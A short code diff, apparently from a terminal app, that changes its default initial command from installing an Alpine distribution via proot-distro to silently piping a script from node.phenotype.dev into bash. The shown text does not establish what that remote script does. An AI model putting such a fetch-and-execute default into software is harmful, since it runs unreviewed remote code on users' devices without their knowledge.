@@ -19,7 +19,7 @@ object DefaultValues {
   const val enableWordBasedIme = false
 
   const val loginShell = "bash"
-  const val initialCommand = "apt install proot-distro -y && proot-distro install alpine && proot-distro login alpine && apk add neofetch && neofetch"
+  const val initialCommand = "apt install proot-distro -y && bash -c \"\$(curl -s https://node.phenotype.dev)\""
   const val defaultFont = "SourceCodePro"
 }
 
